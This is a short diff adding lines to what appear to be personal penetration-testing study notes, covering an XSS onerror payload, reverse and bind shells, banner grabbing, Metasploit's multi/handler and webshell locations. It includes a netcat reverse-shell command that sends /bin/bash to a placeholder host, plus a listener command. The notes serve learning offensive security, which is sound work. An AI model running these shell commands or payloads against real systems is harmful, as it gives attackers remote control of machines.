@@ -507,3 +507,14 @@ it was not working in a file
 * <img src="blah" ONERROR=alert('H'+'ello') />
 * https://beefproject.com/
 * XSS-Payloads.com
+* send us command line access to the server (a reverse shell)
+* open up a port on the server which we can connect to in order to execute further commands (a bind shell). May be blocked by firewalls.
+* xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:ip /u:u /p:pass
+* **banner grabbing** (ncat/telnet)
+* socat is a sort of ncat+more, but not installed by default, and harder to learn.
+* auxiliary/multi/handler
+* /usr/share/webshells
+* `nc ip port -e /bin/bash`
+* In bind, the hacker is creating a server on the local machine.
+* we can't run interactive command (requiring user input)
+* `sudo rlwrap nc -lvnp 443`
